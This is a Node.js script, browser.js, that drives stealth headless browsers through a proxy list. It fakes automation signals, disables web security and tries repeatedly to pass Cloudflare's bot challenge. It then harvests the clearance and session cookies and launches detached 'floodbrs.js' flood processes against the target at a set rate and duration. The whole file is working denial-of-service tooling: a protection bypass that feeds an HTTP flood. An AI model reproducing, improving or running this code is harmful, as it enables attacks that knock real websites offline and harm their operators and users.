const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const async = require('async');
const { spawn, exec } = require('child_process');

puppeteer.use(StealthPlugin());

const COLORS = {
    RED: '\x1b[31m',
    GREEN: '\x1b[32m',
    YELLOW: '\x1b[33m',
    BLUE: '\x1b[34m',
    RESET: '\x1b[0m'
};

// Stealth configuration
const applyStealth = async (page) => {
    await page.evaluateOnNewDocument(() => {
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(navigator, 'plugins', { 
            get: () => [1, 2, 3, 4, 5] 
        });
        
        window.chrome = {
            runtime: {},
            loadTimes: () => ({}),
            csi: () => ({}),
            app: { isInstalled: false }
        };

        delete window.__webdriver_evaluate;
        delete window.__selenium_evaluate;
        delete window.__webdriver_script_function;
    });
};

const getBrowserArgs = () => [
    '--no-sandbox',
    '--disable-setuid-sandbox',
    '--disable-dev-shm-usage',
    '--disable-accelerated-2d-canvas',
    '--disable-gpu',
    '--disable-blink-features=AutomationControlled',
    '--ignore-certificate-errors',
    '--ignore-ssl-errors',
    '--disable-web-security',
    '--disable-features=site-per-process',
    '--window-size=1920,1080'
];

// Cloudflare Solver
const solveCloudflare = async (page, proxy, targetURL) => {
    log('INFO', `Processing ${maskProxy(proxy)}`, 'BLUE');
    
    // Initial wait
    await sleep(12);
    
    let title = await page.title().catch(() => '');
    let currentUrl = page.url();
    
    // Check if challenge passed
    if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
        log('SUCCESS', 'Challenge passed', 'GREEN');
        return { solved: true };
    }

    log('INFO', 'Solving challenge...', 'YELLOW');

    // Strategy 1: Wait for auto-solve
    await sleep(18);
    title = await page.title().catch(() => '');
    if (!title.includes('Just a moment')) {
        log('SUCCESS', 'Challenge passed', 'GREEN');
        return { solved: true };
    }

    // Strategy 2: Interact with challenge iframe
    try {
        const frames = await page.frames();
        for (const frame of frames) {
            const frameUrl = frame.url();
            if (frameUrl.includes('challenges.cloudflare.com') || frameUrl.includes('/cdn-cgi/')) {
                log('INFO', 'Found challenge frame', 'YELLOW');
                
                const challengeSelectors = [
                    'input[type="checkbox"]',
                    '.cf-challenge-checkbox', 
                    'button',
                    'input[type="submit"]',
                    '.btn',
                    '[role="checkbox"]'
                ];
                
                for (const selector of challengeSelectors) {
                    const element = await frame.$(selector);
                    if (element) {
                        await element.click().catch(() => {});
                        log('INFO', `Clicked: ${selector}`, 'YELLOW');
                        await sleep(15);
                        break;
                    }
                }
                
                title = await page.title().catch(() => '');
                if (!title.includes('Just a moment')) {
                    log('SUCCESS', 'Challenge passed', 'GREEN');
                    return { solved: true };
                }
            }
        }
    } catch (error) {
        // Continue to next strategy
    }

    // Strategy 3: Page refresh
    log('INFO', 'Refreshing page...', 'YELLOW');
    await page.reload({ waitUntil: 'networkidle0', timeout: 30000 }).catch(() => {});
    await sleep(15);
    
    title = await page.title().catch(() => '');
    if (!title.includes('Just a moment')) {
        log('SUCCESS', 'Challenge passed', 'GREEN');
        return { solved: true };
    }

    // Strategy 4: Direct navigation
    log('INFO', 'Trying direct navigation...', 'YELLOW');
    await page.setExtraHTTPHeaders({
        'Referer': 'https://www.google.com/'
    });
    
    await page.goto(targetURL, { 
        waitUntil: 'networkidle0', 
        timeout: 45000 
    }).catch(() => {});
    
    await sleep(12);
    title = await page.title().catch(() => '');
    
    if (!title.includes('Just a moment')) {
        log('SUCCESS', 'Challenge passed', 'GREEN');
        return { solved: true };
    }

    log('ERROR', 'Challenge failed', 'RED');
    return { solved: false };
};

// EXTRACT ALL COOKIES FROM TARGET WEBSITE
const extractAllCookies = async (page, targetURL) => {
    await sleep(5);
    
    let allCookies = [];
    let cookieString = '';
    
    // Try multiple extraction methods
    const extractionMethods = [
        // Method 1: Target domain cookies
        async () => {
            const cookies = await page.cookies(targetURL).catch(() => []);
            if (cookies.length > 0) {
                log('COOKIES', `Domain cookies: ${cookies.length}`, 'GREEN');
                return cookies;
            }
            return [];
        },
        
        // Method 2: All cookies from browser
        async () => {
            const cookies = await page.cookies().catch(() => []);
            if (cookies.length > 0) {
                log('COOKIES', `All cookies: ${cookies.length}`, 'GREEN');
                return cookies;
            }
            return [];
        },
        
        // Method 3: Wait and retry domain cookies
        async () => {
            await sleep(3);
            const cookies = await page.cookies(targetURL).catch(() => []);
            if (cookies.length > 0) {
                log('COOKIES', `Retry cookies: ${cookies.length}`, 'GREEN');
                return cookies;
            }
            return [];
        }
    ];
    
    // Try all extraction methods
    for (const method of extractionMethods) {
        try {
            const cookies = await method();
            if (cookies.length > 0) {
                allCookies = cookies;
                cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
                break;
            }
        } catch (error) {
            // Continue to next method
        }
    }
    
    // Log all cookie names found
    if (allCookies.length > 0) {
        const cookieNames = allCookies.map(c => c.name).join(', ');
        log('COOKIES', `Found: ${cookieNames}`, 'GREEN');
        
        // Check for specific important cookies
        const importantCookies = ['cf_clearance', 'session', 'token', 'auth', 'login'];
        const foundImportant = allCookies.filter(c => 
            importantCookies.some(important => c.name.toLowerCase().includes(important))
        );
        
        if (foundImportant.length > 0) {
            const importantNames = foundImportant.map(c => c.name).join(', ');
            log('COOKIES', `Important: ${importantNames}`, 'GREEN');
        }
    } else {
        log('COOKIES', 'No cookies found', 'YELLOW');
    }
    
    return {
        cookies: cookieString,
        cookieCount: allCookies.length,
        cookieNames: allCookies.map(c => c.name)
    };
};

// Command-line setup
if (process.argv.length < 6) {
    console.error('Usage: node browser.js <targetURL> <threads> <proxyFile> <rate> <time>');
    process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

let successCount = 0;
let totalCount = 0;

// Utility functions
const generateRandomString = (length) => {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
};

const validKey = generateRandomString(12);

const readProxies = (filePath) => {
    try {
        return fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
    } catch (error) {
        log('ERROR', 'Cannot read proxy file', 'RED');
        return [];
    }
};

const maskProxy = (proxy) => {
    const parts = proxy.split(':');
    if (parts.length >= 2) {
        const ip = parts[0];
        if (ip.split('.').length === 4) {
            return `${ip.split('.')[0]}.${ip.split('.')[1]}.**.**:****`;
        }
    }
    return proxy;
};

const log = (type, message, color = 'RESET') => {
    const colorCode = COLORS[color] || COLORS.RESET;
    console.log(`${colorCode}[${type}] ${message}${COLORS.RESET}`);
};

const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));

const randomElement = (array) => array[Math.floor(Math.random() * array.length)];

// User agents
const userAgents = [
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`
];

// Browser launcher
const launchBrowser = async (targetURL, proxy, attempt = 1) => {
    const userAgent = randomElement(userAgents);
    let browser;

    const options = {
        headless: true,
        args: [
            `--user-agent=${userAgent}`,
            ...getBrowserArgs()
        ],
        defaultViewport: { 
            width: 1920, 
            height: 1080 
        },
        ignoreHTTPSErrors: true
    };

    try {
        totalCount++;
        log('LAUNCH', `Attempt ${attempt} for ${maskProxy(proxy)}`, 'BLUE');
        
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();

        await applyStealth(page);

        // Navigate to target
        await page.goto(targetURL, { 
            waitUntil: 'networkidle0', 
            timeout: 45000 
        }).catch(() => {});

        // Solve Cloudflare challenge
        const solveResult = await solveCloudflare(page, proxy, targetURL);
        
        if (!solveResult.solved) {
            throw new Error('Cloudflare challenge failed');
        }

        // Extract ALL cookies from the website
        const cookieResult = await extractAllCookies(page, targetURL);
        
        successCount++;
        log('STATS', `Success: ${successCount}/${totalCount} | Cookies: ${cookieResult.cookieCount}`, 'GREEN');

        await browser.close();

        return {
            cookies: cookieResult.cookies,
            userAgent: userAgent,
            cookieCount: cookieResult.cookieCount,
            cookieNames: cookieResult.cookieNames
        };

    } catch (error) {
        if (browser) await browser.close().catch(() => {});
        
        if (attempt < 2) {
            log('RETRY', `Retrying ${maskProxy(proxy)}`, 'YELLOW');
            await sleep(8);
            return launchBrowser(targetURL, proxy, attempt + 1);
        }
        
        log('FAILED', `${maskProxy(proxy)}`, 'RED');
        return null;
    }
};

// Thread handler
const processProxy = async (targetURL, proxy, task, done) => {
    try {
        const result = await launchBrowser(targetURL, proxy);
        
        if (result) {
            // Log hasil cookies yang didapat
            if (result.cookieCount > 0) {
                log('RESULT', `Proxy ${maskProxy(proxy)} - ${result.cookieCount} cookies: ${result.cookieNames.join(', ')}`, 'GREEN');
            }
            
            // Launch flood process dengan semua cookies
            try {
                const floodProcess = spawn('node', [
                    'floodbrs.js',
                    targetURL,
                    duration.toString(),
                    rate,
                    threads.toString(),
                    proxyFile,
                    result.cookies,
                    result.userAgent,
                    validKey
                ], {
                    detached: true,
                    stdio: 'ignore'
                });
                floodProcess.unref();
                log('FLOOD', 'Process started', 'GREEN');
            } catch (error) {
                log('ERROR', 'Failed to start flood', 'RED');
            }
        }

        done(null, { task });
    } catch (error) {
        done(null, { task });
    }
};

// Main execution
const main = async () => {
    const proxies = readProxies(proxyFile);
    
    if (proxies.length === 0) {
        log('ERROR', 'No proxies found', 'RED');
        process.exit(1);
    }

    log('START', `Target: ${targetURL}`, 'GREEN');
    log('INFO', `Proxies: ${proxies.length} | Threads: ${threads} | Time: ${duration}s`, 'BLUE');

    // Process proxies dengan concurrency control
    const queue = async.queue((task, done) => {
        processProxy(targetURL, task.proxy, task, done);
    }, threads);

    proxies.forEach(proxy => {
        queue.push({ proxy });
    });

    queue.drain(() => {
        log('COMPLETE', `Finished - Success: ${successCount}/${totalCount}`, 'GREEN');
    });

    // Auto shutdown setelah duration
    setTimeout(() => {
        log('INFO', 'Time limit reached - Shutting down', 'YELLOW');
        queue.kill();
        process.exit(0);
    }, duration * 1000);
};

// Error handling
process.on('uncaughtException', (error) => {
    log('ERROR', error.message, 'RED');
});

process.on('unhandledRejection', (error) => {
    log('ERROR', error.message, 'RED');
});

process.on('SIGINT', () => {
    log('INFO', 'Shutdown signal received', 'YELLOW');
    process.exit(0);
});

log('READY', 'Cloudflare Solver Started - All Cookies Extraction', 'GREEN');
main().catch(error => {
    log('ERROR', error.message, 'RED');
    process.exit(1);
});
